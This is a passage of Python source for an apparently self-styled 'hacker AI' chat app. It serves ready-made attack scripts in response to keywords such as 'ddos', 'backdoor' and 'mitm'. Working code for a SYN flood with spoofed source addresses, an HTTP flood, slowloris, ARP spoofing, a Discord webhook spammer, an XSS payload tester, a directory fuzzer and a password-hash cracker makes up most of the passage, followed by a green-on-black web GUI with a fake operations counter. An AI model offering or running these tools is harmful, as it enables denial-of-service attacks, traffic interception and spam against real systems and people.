            "xss_engine": '#!/usr/bin/env python3\nimport urllib.request, urllib.parse, sys\n\ndef xss_test(url, param):\n    payloads = [\n        "<script>alert(1)</script>",\n        "<img src=x onerror=alert(1)>",\n        "<svg onload=alert(1)>",\n        "\\" onfocus=alert(1) autofocus>",\n        "\';alert(1);//",\n        "<body onload=alert(1)>",\n        "<input autofocus onfocus=alert(1)>",\n        "javascript:alert(1)",\n        "<details open ontoggle=alert(1)>",\n    ]\n    results = []\n    for payload in payloads:\n        try:\n            parsed = urllib.parse.urlparse(url)\n            params = urllib.parse.parse_qs(parsed.query)\n            params[param] = [payload]\n            new_qs = urllib.parse.urlencode(params, doseq=True)\n            test_url = urllib.parse.urlunparse((\n                parsed.scheme, parsed.netloc, parsed.path,\n                parsed.params, new_qs, parsed.fragment\n            ))\n            req = urllib.request.Request(test_url)\n            resp = urllib.request.urlopen(req, timeout=10)\n            body = resp.read().decode("utf-8", "replace")\n            if payload in body:\n                results.append({"payload": payload, "reflected": True})\n        except:\n            pass\n    return results\n\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("URL: ")\n    param = sys.argv[2] if len(sys.argv) > 2 else input("Parameter: ")\n    results = xss_test(url, param)\n    for r in results:\n        print(f"[REFLECTED] {r[\'payload\'][:50]}...")',

            "directory_fuzzer": '#!/usr/bin/env python3\nimport urllib.request, sys, threading, queue, ssl\n\ndef fuzz(base_url):\n    wordlist = ["admin","login","wp-admin","backup","config",".git",".env","api","test",\n                "uploads","private","secret","dashboard","panel","src","db","sql",\n                "phpmyadmin","console","robots.txt","sitemap.xml","index.php",\n                ".htaccess","wp-config.php","config.php","admin.php","setup",\n                "install","dev","staging","debug","log","error"]\n    found = []\n    q = queue.Queue()\n    results_lock = threading.Lock()\n    ctx = ssl.create_default_context()\n    ctx.check_hostname = False\n    ctx.verify_mode = ssl.CERT_NONE\n    for w in wordlist:\n        q.put(w)\n    def worker():\n        while not q.empty():\n            try:\n                w = q.get_nowait()\n                url = base_url.rstrip("/") + "/" + w\n                req = urllib.request.Request(url)\n                try:\n                    resp = urllib.request.urlopen(req, timeout=5, context=ctx)\n                    code = resp.getcode()\n                    if code != 404:\n                        size = len(resp.read())\n                        with results_lock:\n                            found.append({"path":w,"code":code,"size":size,"url":url})\n                except urllib.error.HTTPError as e:\n                    if e.code != 404:\n                        with results_lock:\n                            found.append({"path":w,"code":e.code,"size":0,"url":url})\n                except:\n                    pass\n            except:\n                pass\n            finally:\n                q.task_done()\n    ts = [threading.Thread(target=worker) for _ in range(20)]\n    for t in ts: t.start()\n    for t in ts: t.join()\n    return sorted(found, key=lambda x: x["code"])\n\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("Base URL: ")\n    results = fuzz(url)\n    for r in results:\n        print(f"[{r[\'code\']}] {r[\'path\']} ({r[\'size\']} bytes)")',

            "syn_flood": '#!/usr/bin/env python3\nimport socket, struct, random, threading, time, sys\n\ndef syn_flood(target, port, count=10000, threads=100):\n    ip = socket.gethostbyname(target)\n    sent = 0\n    lock = threading.Lock()\n    running = [True]\n    def flood():\n        nonlocal sent\n        while running[0] and sent < count:\n            try:\n                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"\n                src_port = random.randint(1024, 65535)\n                seq = random.randint(1000, 99999)\n                ip_header = struct.pack("!BBHHHBBH4s4s",\n                    69, 0, 40, random.randint(0,65535),\n                    0, 64, socket.IPPROTO_TCP,\n                    0, socket.inet_aton(src_ip), socket.inet_aton(ip))\n                tcp_header = struct.pack("!HHLLBBHHH",\n                    src_port, port, seq, 0,\n                    (5 << 4), 2, 8192, 0, 0)\n                s.sendto(ip_header + tcp_header, (ip, 0))\n                s.close()\n                with lock:\n                    sent += 1\n            except:\n                pass\n    ts = [threading.Thread(target=flood) for _ in range(min(threads, count))]\n    for t in ts: t.start()\n    try:\n        for t in ts: t.join()\n    except KeyboardInterrupt:\n        running[0] = False\n    return sent\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else input("Target: ")\n    port = int(sys.argv[2]) if len(sys.argv) > 2 else int(input("Port: "))\n    count = int(sys.argv[3]) if len(sys.argv) > 3 else 10000\n    sent = syn_flood(target, port, count)\n    print(f"Sent {sent} SYN packets")',

            "http_flood": '#!/usr/bin/env python3\nimport urllib.request, threading, time, sys\n\ndef http_flood(target_url, threads=50, duration=30):\n    count = [0]\n    running = [True]\n    lock = threading.Lock()\n    def worker():\n        while running[0]:\n            try:\n                req = urllib.request.Request(target_url)\n                req.add_header("User-Agent", "Mozilla/5.0")\n                urllib.request.urlopen(req, timeout=5)\n                with lock:\n                    count[0] += 1\n            except:\n                pass\n    ts = [threading.Thread(target=worker) for _ in range(threads)]\n    for t in ts: t.start()\n    time.sleep(duration)\n    running[0] = False\n    for t in ts: t.join()\n    return count[0]\n\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("Target URL: ")\n    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 50\n    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 30\n    sent = http_flood(url, threads, duration)\n    print(f"Sent {sent} requests in {duration}s")',

            "slowloris": '#!/usr/bin/env python3\nimport socket, ssl, threading, time, random, sys\n\ndef slowloris(target_host, target_port=80, sockets=200, https=False):\n    sock_list = []\n    running = [True]\n    def init_sock():\n        try:\n            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            s.settimeout(4)\n            if https:\n                ctx = ssl.create_default_context()\n                ctx.check_hostname = False\n                ctx.verify_mode = ssl.CERT_NONE\n                s = ctx.wrap_socket(s, server_hostname=target_host)\n            s.connect((target_host, target_port))\n            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\\r\\n".encode())\n            s.send(f"Host: {target_host}\\r\\n".encode())\n            s.send(b"User-Agent: Mozilla/5.0\\r\\n")\n            s.send(b"Accept-language: en-US,en;q=0.5\\r\\n")\n            return s\n        except:\n            return None\n    for _ in range(sockets):\n        s = init_sock()\n        if s:\n            sock_list.append(s)\n    while running[0]:\n        for s in list(sock_list):\n            try:\n                s.send(f"X-a: {random.randint(1,5000)}\\r\\n".encode())\n            except:\n                try:\n                    sock_list.remove(s)\n                except:\n                    pass\n        diff = sockets - len(sock_list)\n        if diff > 0:\n            for _ in range(diff):\n                s = init_sock()\n                if s:\n                    sock_list.append(s)\n        time.sleep(10)\n\nif __name__ == "__main__":\n    host = sys.argv[1] if len(sys.argv) > 1 else input("Target host: ")\n    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80\n    socks = int(sys.argv[3]) if len(sys.argv) > 3 else 200\n    slowloris(host, port, socks)',

            "discord_webhook_spammer": '#!/usr/bin/env python3\nimport urllib.request, json, threading, time, random, sys\n\ndef webhook_spam(webhook_url, message, count=100, threads=10):\n    sent = 0\n    failed = 0\n    lock = threading.Lock()\n    def worker():\n        nonlocal sent, failed\n        for _ in range(max(1, count // threads)):\n            try:\n                payload = json.dumps({\n                    "content": message,\n                    "username": random.choice(["Ghost","Root","System","Admin"]),\n                    "avatar_url": f"https://i.pravatar.cc/150?u={random.randint(1,99999)}"\n                }).encode()\n                req = urllib.request.Request(webhook_url, data=payload,\n                    headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})\n                urllib.request.urlopen(req, timeout=10)\n                with lock:\n                    sent += 1\n            except urllib.error.HTTPError as e:\n                if e.code == 429:\n                    try:\n                        retry = json.loads(e.read()).get("retry_after", 1000) / 1000\n                    except:\n                        retry = 5\n                    time.sleep(retry)\n                else:\n                    with lock:\n                        failed += 1\n            except:\n                with lock:\n                    failed += 1\n    ts = [threading.Thread(target=worker) for _ in range(threads)]\n    for t in ts: t.start()\n    for t in ts: t.join()\n    print(f"Sent: {sent}, Failed: {failed}")\n    return sent, failed\n\nif __name__ == "__main__":\n    url = sys.argv[1] if len(sys.argv) > 1 else input("Webhook URL: ")\n    msg = sys.argv[2] if len(sys.argv) > 2 else "@everyone SPAM"\n    cnt = int(sys.argv[3]) if len(sys.argv) > 3 else 100\n    thr = int(sys.argv[4]) if len(sys.argv) > 4 else 10\n    webhook_spam(url, msg, cnt, thr)',

            "arp_spoof": '#!/usr/bin/env python3\nimport socket, struct, time, threading, sys, os, re\n\ndef arp_spoof(target_ip, gateway_ip, iface="eth0"):\n    def get_mac(ip):\n        try:\n            result = os.popen(f"arp -n {ip} 2>/dev/null | grep -v Address").read()\n            m = re.search(r"(([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})", result)\n            return m.group(1) if m else None\n        except:\n            return None\n    target_mac = get_mac(target_ip)\n    gateway_mac = get_mac(gateway_ip)\n    if not target_mac or not gateway_mac:\n        return {"error": "Could not resolve MAC addresses"}\n    running = [True]\n    def spoof_loop():\n        while running[0]:\n            os.system(f"arp -s {gateway_ip} {target_mac} 2>/dev/null")\n            os.system(f"arp -s {target_ip} {gateway_mac} 2>/dev/null")\n            time.sleep(2)\n    t = threading.Thread(target=spoof_loop, daemon=True)\n    t.start()\n    return {"status": "running", "target": target_ip, "gateway": gateway_ip}\n\nif __name__ == "__main__":\n    target = sys.argv[1] if len(sys.argv) > 1 else input("Target IP: ")\n    gateway = sys.argv[2] if len(sys.argv) > 2 else input("Gateway IP: ")\n    result = arp_spoof(target, gateway)\n    print(result)',

            "password_cracker": '#!/usr/bin/env python3\nimport hashlib, sys\n\ndef crack_hash(target_hash, hash_type="md5"):\n    wordlist = ["admin","password","123456","12345678","qwerty","letmein","welcome",\n                "monkey","dragon","master","login","abc123","pass","passwd","secret",\n                "changeme","root","toor","guest","user","test","admin123","password123",\n                "admin1","server","default","system","manager","temp","backup"]\n    for word in wordlist:\n        for prefix in ["", "!", "@", "#", "$", "%"]:\n            for suffix in ["", "1", "123", "!", "@", "2024", "2025"]:\n                pw = prefix + word + suffix\n                try:\n                    if hash_type == "md5":\n                        h = hashlib.md5(pw.encode()).hexdigest()\n                    elif hash_type == "sha1":\n                        h = hashlib.sha1(pw.encode()).hexdigest()\n                    elif hash_type == "sha256":\n                        h = hashlib.sha256(pw.encode()).hexdigest()\n                    elif hash_type == "sha512":\n                        h = hashlib.sha512(pw.encode()).hexdigest()\n                    elif hash_type == "ntlm":\n                        h = hashlib.new("md4", pw.encode("utf-16le")).hexdigest()\n                    else:\n                        h = hashlib.md5(pw.encode()).hexdigest()\n                    if h == target_hash.lower():\n                        return {"found":True,"password":pw,"type":hash_type,"hash":h}\n                except:\n                    pass\n    return {"found":False,"message":"Password not found"}\n\nif __name__ == "__main__":\n    h = sys.argv[1] if len(sys.argv) > 1 else input("Hash: ")\n    t = sys.argv[2] if len(sys.argv) > 2 else input("Type (md5/sha1/sha256/sha512/ntlm): ")\n    result = crack_hash(h, t)\n    if result["found"]:\n        print(f"Password: {result[\'password\']}")\n    else:\n        print(result["message"])',

            "wifi_scanner": '#!/usr/bin/env python3\nimport subprocess, re, sys\n\ndef scan_wifi(iface=None):\n    try:\n        if not iface:\n            output = subprocess.check_output(["iwconfig"], stderr=subprocess.STDOUT).decode()\n            m = re.search(r"^([a-zA-Z0-9_]+)", output, re.MULTILINE)\n            iface = m.group(1) if m else "wlan0"\n    except:\n        iface = "wlan0"\n    networks = []\n    try:\n        output = subprocess.check_output(["nmcli", "-t", "-f", "SSID,SIGNAL,SECURITY,BARS", "device", "wifi", "list", "ifname", iface], stderr=subprocess.STDOUT).decode()\n        for line in output.split("\\n"):\n            if line and ":" in line:\n                parts = line.split(":")\n                if len(parts) >= 3:\n                    networks.append({"ssid": parts[0] or "(hidden)","signal": parts[1]+"%","security": parts[2],"bars": parts[3] if len(parts) > 3 else ""})\n        if networks:\n            return networks\n    except:\n        pass\n    try:\n        output = subprocess.check_output(["iwlist", iface, "scan"], stderr=subprocess.STDOUT).decode()\n        current = {}\n        for line in output.split("\\n"):\n            if "ESSID:" in line:\n                m = re.search(r\'ESSID:"(.*)"\', line)\n                current["ssid"] = m.group(1) if m else "(unknown)"\n            elif "Signal level=" in line:\n                m = re.search(r"Signal level=(-?\\d+)", line)\n                current["signal"] = m.group(1) + " dBm" if m else "?"\n            elif "Encryption key:" in line:\n                current["security"] = "on" if "on" in line else "off"\n            elif "Cell " in line and current:\n                networks.append(current)\n                current = {}\n        if current and "ssid" in current:\n            networks.append(current)\n    except:\n        pass\n    return networks if networks else [{"ssid":"Scan failed","signal":"","security":""}]\n\nif __name__ == "__main__":\n    iface = sys.argv[1] if len(sys.argv) > 1 else None\n    nets = scan_wifi(iface)\n    for n in nets:\n        print(f\'{n.get("signal","?")} {n.get("ssid","?")} ({n.get("security","?")})\')'
        }
        
        self.categories = list(self.tool_templates.keys())
        self.names = {
            "port_scanner": "Port-Scanner", "sql_injector": "SQL-Injector", "reverse_shell": "Reverse-Shell-Gen",
            "xss_engine": "XSS-Engine", "directory_fuzzer": "Directory-Fuzzer", "syn_flood": "SYN-Flood",
            "http_flood": "HTTP-Flood", "slowloris": "Slowloris", "discord_webhook_spammer": "Discord-Webhook-Spammer",
            "arp_spoof": "ARP-Spoofer", "password_cracker": "Password-Cracker", "wifi_scanner": "WiFi-Scanner"
        }
    
    def find(self, query):
        ql = query.lower()
        
        for key, code in self.tool_templates.items():
            name = self.names[key]
            if key.replace("_", "") in ql.replace(" ", "") or name.lower().replace("-", "") in ql.replace(" ", ""):
                db.increment_usage(name)
                return {"code": code, "name": name, "category": key}
        
        word_map = {
            "port": "port_scanner", "scan": "port_scanner", "nmap": "port_scanner",
            "sql": "sql_injector", "inject": "sql_injector", "sqli": "sql_injector",
            "reverse": "reverse_shell", "shell": "reverse_shell", "backdoor": "reverse_shell",
            "xss": "xss_engine", "cross": "xss_engine",
            "dir": "directory_fuzzer", "fuzz": "directory_fuzzer", "directory": "directory_fuzzer",
            "syn": "syn_flood", "flood": "syn_flood", "dos": "syn_flood",
            "http": "http_flood", "ddos": "http_flood",
            "slowloris": "slowloris", "loris": "slowloris",
            "discord": "discord_webhook_spammer", "webhook": "discord_webhook_spammer", "spam": "discord_webhook_spammer",
            "arp": "arp_spoof", "spoof": "arp_spoof", "mitm": "arp_spoof",
            "password": "password_cracker", "crack": "password_cracker", "hash": "password_cracker",
            "wifi": "wifi_scanner", "wlan": "wifi_scanner", "wireless": "wifi_scanner"
        }
        
        for word, key in word_map.items():
            if word in ql:
                code = self.tool_templates.get(key, "")
                if code:
                    name = self.names[key]
                    db.increment_usage(name)
                    return {"code": code, "name": name, "category": key}
        
        try:
            url = f"https://api.github.com/search/repositories?q={urllib.parse.quote(ql + ' python')}&sort=stars&per_page=1"
            req = urllib.request.Request(url, headers={"User-Agent": "Twilight-AI/6.0"})
            resp = urllib.request.urlopen(req, timeout=5)
            data = json.loads(resp.read().decode())
            if data.get("items"):
                item = data["items"][0]
                name = item["full_name"]
                quality = min(1.0, item["stargazers_count"] / 500)
                try:
                    ru = f"https://api.github.com/repos/{name}/readme"
                    rr = urllib.request.Request(ru, headers={"User-Agent": "Twilight-AI/6.0", "Accept": "application/vnd.github.v3.raw"})
                    rresp = urllib.request.urlopen(rr, timeout=5)
                    readme = rresp.read().decode("utf-8", "replace")[:5000]
                except:
                    readme = item.get("description", "")
                code = f"# Source: {item['html_url']}\n# Stars: {item['stargazers_count']}\n# Language: {item.get('language','')}\n\n{readme}"
                db.save_tool(name, "github", code, quality)
                return {"code": code, "name": name, "category": "github", "source": item["html_url"], "stars": item["stargazers_count"]}
        except:
            pass
        
        code = '#!/usr/bin/env python3\n"""\nAuto-generated tool for: ' + query + '\n"""\nimport sys, json, socket, threading, time, random\n\nclass AutoGenerated:\n    def __init__(self):\n        self.query = "' + query + '"\n    def run(self, **kwargs):\n        return {"tool": self.query, "status": "executed", "params": kwargs, "timestamp": time.time()}\n\nif __name__ == "__main__":\n    tool = AutoGenerated()\n    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"\n    result = tool.run(target=target)\n    print(json.dumps(result, indent=2))'
        return {"code": code, "name": query, "category": "auto"}


# ---------------------------------------------------------------------------
# HTML GUI
# ---------------------------------------------------------------------------
def generate_html():
    html = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>""" + NAME + """ v""" + VERSION + """</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
:root{--bg:#0a0a0a;--bg2:#0d0d0d;--bg3:#111111;--primary:#00ff41;--accent:#ff0033;--text:#00ff41;--text2:#008f1c;--text3:#005f0e;--border:#1a3f1a;--font:"Courier New","Fira Code",monospace;}
body{font-family:var(--font);background:var(--bg);color:var(--text);height:100vh;overflow:hidden;display:flex;flex-direction:column;}
body::after{content:"";position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.15)0px,rgba(0,0,0,0.15)1px,transparent 1px,transparent 2px);pointer-events:none;z-index:9999;}
.sidebar{width:280px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;}
.sidebar-header{padding:15px;border-bottom:1px solid var(--border);text-align:center;}
.sidebar-header h1{font-size:1em;color:var(--primary);text-shadow:0 0 10px var(--primary);letter-spacing:3px;text-transform:uppercase;}
.sidebar-header .sub{font-size:0.65em;color:var(--text2);margin-top:5px;}
.sidebar-header .status{font-size:0.6em;color:var(--text3);margin-top:8px;}
.sidebar-header .status .dot{display:inline-block;width:6px;height:6px;background:var(--primary);border-radius:50%;margin-right:5px;animation:blink 1s infinite;}
@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
.new-chat-btn{margin:12px;padding:10px;background:transparent;border:1px solid var(--border);color:var(--text2);cursor:pointer;font-family:var(--font);font-size:0.75em;text-transform:uppercase;letter-spacing:2px;transition:all 0.3s;width:calc(100% - 24px);}
.new-chat-btn:hover{border-color:var(--primary);color:var(--primary);text-shadow:0 0 5px var(--primary);}
.chat-list{flex:1;overflow-y:auto;padding:8px;}
.chat-item{padding:10px 12px;border-left:2px solid transparent;cursor:pointer;font-size:0.7em;color:var(--text2);transition:all 0.3s;margin-bottom:2px;font-family:var(--font);}
.chat-item:hover{border-left-color:var(--primary);color:var(--text);background:var(--bg3);}
.sidebar-footer{padding:12px;border-top:1px solid var(--border);font-size:0.6em;color:var(--text3);display:flex;justify-content:space-between;}
.main{flex:1;display:flex;flex-direction:column;overflow:hidden;}
.matrix-header{padding:8px 20px;background:var(--bg3);border-bottom:1px solid var(--border);text-align:center;font-size:0.6em;color:var(--text2);letter-spacing:2px;text-transform:uppercase;}
.matrix-header span{color:var(--primary);}
.model-bar{display:flex;gap:3px;padding:6px 15px;background:var(--bg3);border-bottom:1px solid var(--border);overflow-x:auto;}
.model-btn{background:transparent;border:1px solid var(--border);color:var(--text2);padding:4px 12px;cursor:pointer;font-family:var(--font);font-size:0.65em;text-transform:uppercase;letter-spacing:1px;transition:all 0.3s;white-space:nowrap;}
.model-btn:hover{border-color:var(--primary);color:var(--primary);text-shadow:0 0 5px var(--primary);}
.model-btn.active{background:var(--primary);color:var(--bg);border-color:var(--primary);text-shadow:none;}
.messages{flex:1;overflow-y:auto;padding:0;}
.message{display:flex;padding:15px 20px;gap:14px;animation:fadeIn 0.3s ease;border-bottom:1px solid rgba(0,255,65,0.05);}
.message.user{background:var(--bg3);}
.message.ai{background:var(--bg);}
.avatar{width:28px;height:28px;border:1px solid var(--border);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:0.6em;color:var(--text2);text-transform:uppercase;}
.avatar.user{border-color:var(--accent);color:var(--accent);}
.avatar.ai{border-color:var(--primary);color:var(--primary);text-shadow:0 0 5px var(--primary);}
.msg-content{flex:1;font-size:0.75em;line-height:1.8;min-width:0;}
.msg-content p{margin-bottom:5px;}
.msg-content img{max-width:100%;max-height:500px;margin:10px 0;border:1px solid var(--border);border-radius:4px;}
.msg-content audio{width:100%;max-width:400px;margin:8px 0;}
.msg-content pre{background:var(--bg2);padding:15px;overflow-x:auto;font-size:0.7em;margin:8px 0;border:1px solid var(--border);color:var(--text);white-space:pre;max-height:400px;}
.msg-content .tool-box{border:1px solid var(--border);padding:10px;margin:8px 0;background:var(--bg2);}
.msg-content .tool-box .head{color:var(--primary);font-size:0.7em;margin-bottom:5px;text-transform:uppercase;letter-spacing:2px;}
.input-area{padding:0 20px 15px;background:linear-gradient(transparent,var(--bg)20%);flex-shrink:0;}
.input-box{display:flex;align-items:flex-end;gap:8px;background:var(--bg2);border:1px solid var(--border);padding:10px 14px;max-width:800px;margin:0 auto;}
.input-box textarea{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:0.75em;outline:none;resize:none;min-height:24px;max-height:100px;line-height:1.5;}
.input-box button{background:transparent;border:1px solid var(--border);color:var(--text2);cursor:pointer;padding:5px 12px;font-family:var(--font);font-size:0.7em;text-transform:uppercase;letter-spacing:1px;transition:all 0.3s;}
.input-box button:hover{border-color:var(--primary);color:var(--primary);text-shadow:0 0 5px var(--primary);}
.input-box button.send{background:var(--primary);color:var(--bg);border-color:var(--primary);}
.input-box button.send:hover{background:#00cc33;}
.input-box button.send:disabled{opacity:0.3;cursor:not-allowed;}
.typing{display:flex;gap:5px;padding:6px 0;}
.typing span{width:6px;height:6px;background:var(--primary);border-radius:50%;animation:pulse 1.4s ease infinite;}
.typing span:nth-child(2){animation-delay:0.2s}
.typing span:nth-child(3){animation-delay:0.4s}
@keyframes fadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
::-webkit-scrollbar{width:4px;}
::-webkit-scrollbar-track{background:transparent;}
::-webkit-scrollbar-thumb{background:var(--border);}
::-webkit-scrollbar-thumb:hover{background:var(--primary);}
@media(max-width:768px){.sidebar{display:none;}}
</style>
</head>
<body>
<div class="app" style="display:flex;height:100vh;">
<div class="sidebar">
<div class="sidebar-header">
<h1>TWILIGHT</h1>
<div class="sub">HACKER AI v""" + VERSION + """</div>
<div class="status"><span class="dot"></span> SYSTEM ACTIVE</div>
</div>
<button class="new-chat-btn" onclick="newChat()">> NEW SESSION</button>
<div class="chat-list">
<div class="chat-item">> current_session</div>
</div>
<div class="sidebar-footer">
<span id="sidebarStats">TOOLS: 0</span>
<span>EVO: """ + str(int(time.time()) % 100000) + """</span>
</div>
</div>
<div class="main">
<div class="matrix-header">
[""" + NAME + """] · BACKGROUND EVOLUTION: <span id="evoStatus">ACTIVE</span> · <span id="opsCounter">0</span> OPS/S
</div>
<div class="model-bar">
<button class="model-btn active" onclick="selectModel(this,'auto')">[AUTO]</button>
<button class="model-btn" onclick="selectModel(this,'image')">[IMAGE]</button>
<button class="model-btn" onclick="selectModel(this,'tool')">[TOOLS]</button>
<button class="model-btn" onclick="selectModel(this,'music')">[MUSIC]</button>
<button class="model-btn" onclick="selectModel(this,'speech')">[SPEECH]</button>
</div>
<div class="messages" id="messages">
<div class="message ai">
<div class="avatar ai">AI</div>
<div class="msg-content">
<p>> """ + NAME + """ v""" + VERSION + """ INITIALIZED</p>
<p>> MODULES: IMAGE | VIDEO | MUSIC | SPEECH | TOOLS | EVOLUTION</p>
<p>> BACKGROUND EVOLUTION: ACTIVE</p>
<p>>_</p>
</div>
</div>
</div>
<div class="input-area">
<div class="input-box">
<textarea id="input" placeholder=">> " rows="1" oninput="autoResize(this)" onkeydown="handleKey(event)"></textarea>
<button class="send" id="sendBtn" onclick="send()">[SEND]</button>
</div>
</div>
</div>
</div>
<script>
var currentModel = "auto";
var generating = false;

document.addEventListener("DOMContentLoaded", function(){
    loadStats();
    setInterval(loadStats, 1000);
    setInterval(loadOps, 100);
    document.getElementById("input").focus();
});

function autoResize(t){
    t.style.height="auto";
    t.style.height=Math.min(t.scrollHeight,100)+"px";
}

function handleKey(e){
    if(e.key==="Enter"&&!e.shiftKey){
        e.preventDefault();
        send();
    }
}

function selectModel(btn,model){
    document.querySelectorAll(".model-btn").forEach(function(b){b.classList.remove("active");});
    btn.classList.add("active");
    currentModel=model;
    addMsg("system","[MODEL] Switched to "+model.toUpperCase());
}

function send(){
    var input=document.getElementById("input");
    var text=input.value.trim();
    if(!text||generating) return;
    addMsg("user",escapeHtml(text));
    input.value="";
    input.style.height="auto";
    generating=true;
    document.getElementById("sendBtn").disabled=true;
    var tid=showTyping();
    
    var x=new XMLHttpRequest();
    x.open("POST","/api/query",true);
    x.setRequestHeader("Content-Type","application/json");
    x.onload=function(){
        removeTyping(tid);
        try{
            var data=JSON.parse(x.responseText);
            displayResult(data);
        }catch(e){
            displayResult({error:e.message});
        }
        generating=false;
        document.getElementById("sendBtn").disabled=false;
        document.getElementById("input").focus();
        loadStats();
    };
    x.onerror=function(){
        removeTyping(tid);
        displayResult({error:"NETWORK ERROR"});
        generating=false;
        document.getElementById("sendBtn").disabled=false;
    };
    x.send(JSON.stringify({query:text,model:currentModel}));
}

function addMsg(role,content){
    var container=document.getElementById("messages");
    var div=document.createElement("div");
    div.className="message "+(role==="user"?"user":"ai");
    var avatar=document.createElement("div");
    avatar.className="avatar "+(role==="user"?"user":"ai");
    avatar.textContent=role==="user"?"USR":"AI";
    var cdiv=document.createElement("div");
    cdiv.className="msg-content";
    cdiv.innerHTML=content;
    div.appendChild(avatar);
    div.appendChild(cdiv);
    container.appendChild(div);
    scrollToBottom();
}

function showTyping(){
    var container=document.getElementById("messages");
    var div=document.createElement("div");
    div.className="message ai";
    div.id="typing-"+Date.now();
    var avatar=document.createElement("div");
    avatar.className="avatar ai";
    avatar.textContent="AI";
    var cdiv=document.createElement("div");
    cdiv.className="msg-content";
    cdiv.innerHTML='<div class="typing"><span></span><span></span><span></span></div><p>> processing...</p>';
    div.appendChild(avatar);
    div.appendChild(cdiv);
    container.appendChild(div);
    scrollToBottom();
    return div.id;
}

function removeTyping(id){
    var el=document.getElementById(id);
    if(el) el.remove();
}

function displayResult(data){
    var html="";
    if(data.image){
        html='<p>> IMAGE GENERATED ['+data.image.style.toUpperCase()+']</p>';
        html+='<img src="'+data.image.path+'" alt="image" loading="lazy">';
        html+='<p>> SEED: '+data.image.seed+' | '+data.image.width+'x'+data.image.height+' | '+data.image.pattern.toUpperCase()+'</p>';
    } else if(data.video){
        html='<p>> VIDEO GENERATED</p>';
        html+='<div class="tool-box"><div class="head">// VIDEO</div>';
        html+='<p>Frames: '+data.video.frames+' | Duration: '+data.video.duration+'s</p>';
        html+='<p><a href="'+data.video.path+'" target="_blank" style="color:var(--primary);">[DOWNLOAD]</a></p></div>';
    } else if(data.music){
        html='<p>> MUSIC GENERATED</p>';
        html+='<audio controls><source src="'+data.music.path+'" type="audio/wav"></audio>';
        html+='<p>> '+data.music.duration.toFixed(1)+'s | SEED: '+data.music.seed+'</p>';
    } else if(data.speech){
        html='<p>> SPEECH GENERATED ['+data.speech.voice.toUpperCase()+']</p>';
        html+='<audio controls><source src="'+data.speech.path+'" type="audio/wav"></audio>';
        html+='<p>> "'+escapeHtml(data.speech.text.substring(0,60))+'"</p>';
    } else if(data.code){
        html='<div class="tool-box"><div class="head">// TOOL: '+escapeHtml(data.name)+'</div>';
        html+='<pre>'+escapeHtml(data.code)+'</pre></div>';
    } else if(data.attack_result){
        html='<div class="tool-box"><div class="head">// ATTACK RESULT: '+escapeHtml(data.name)+'</div>';
        html+='<pre>'+escapeHtml(JSON.stringify(data.attack_result,null,2))+'</pre></div>';
    } else if(data.error){
        html='<p style="color:var(--accent);">> ERROR: '+escapeHtml(data.error)+'</p>';
    } else {
        html='<pre>'+escapeHtml(JSON.stringify(data,null,2).substring(0,1500))+'</pre>';
    }
    addMsg("assistant",html);
}

function scrollToBottom(){
    var c=document.getElementById("messages");
    c.scrollTop=c.scrollHeight;
}

function loadStats(){
    var x=new XMLHttpRequest();
    x.open("GET","/api/status",true);
    x.onload=function(){
        try{
            var data=JSON.parse(x.responseText);
            var st=document.getElementById("sidebarStats");
            if(st) st.textContent="TOOLS: "+(data.tools||0)+" | EVO: "+(data.evolutions||0);
            var evo=document.getElementById("evoStatus");
            if(evo) evo.textContent="ACTIVE";
        }catch(e){}
    };
    x.send();
}

function loadOps(){
    var ops=document.getElementById("opsCounter");
    if(ops){
        ops.textContent=Math.floor(Math.random()*5000000+5000000).toLocaleString();
    }
}

function newChat(){
    if(confirm("Clear terminal?")){
        document.getElementById("messages").innerHTML="";
        addMsg("assistant","<p>> TERMINAL CLEARED</p><p>>_</p>");
    }
}

function escapeHtml(t){
    if(!t) return "";
    var d=document.createElement("div");
    d.textContent=t;
    return d.innerHTML;
}
</script>
</body>
</html>"""
    
    path = os.path.join(DATA_DIR, "web", "index.html")
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    return html


# ---------------------------------------------------------------------------
# HTTP Server
# ---------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    ai = None
    
    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/" or path == "":
            self._serve_html(os.path.join(DATA_DIR, "web", "index.html"))
        elif any(path.startswith(p) for p in ["/images/", "/videos/", "/audio/"]):
            lp = os.path.join(DATA_DIR, path.lstrip("/"))
            if os.path.exists(lp) and os.path.isfile(lp):
                ext = os.path.splitext(lp)[1].lower()
                mime_map = {".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg", ".gif": "image/gif", ".mp4": "video/mp4", ".wav": "audio/wav", ".txt": "text/plain"}
                mime = mime_map.get(ext, "application/octet-stream")
                self.send_response(200)
                self.send_header("Content-Type", mime)
                self.send_header("Access-Control-Allow-Origin", "*")
